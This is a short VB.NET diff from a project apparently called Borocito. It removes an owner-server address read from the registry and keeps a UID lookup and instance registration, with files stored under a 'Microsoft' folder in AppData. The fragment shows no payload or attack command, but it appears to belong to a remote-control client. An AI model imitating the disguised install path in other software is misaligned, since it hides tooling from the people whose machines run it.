@@ -3,7 +3,6 @@ Module GlobalUses
     Public parameters As String
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
     Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
-    Public HttpOwnerServer As String
 End Module
 Module Utility
     Public tlmContent As String
@@ -54,14 +53,11 @@ Module Utility
 End Module
 Module Memory
     Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
-    Public OwnerServer As String
     Public UID As String
     Sub LoadRegedit()
         Try
             AddToLog("LoadRegedit@Memory", "Loading data...", False)
-            OwnerServer = regKey.GetValue("OwnerServer")
             UID = regKey.GetValue("UID")
-            HttpOwnerServer = "http://" & OwnerServer
             RegisterInstance()
         Catch ex As Exception
             AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
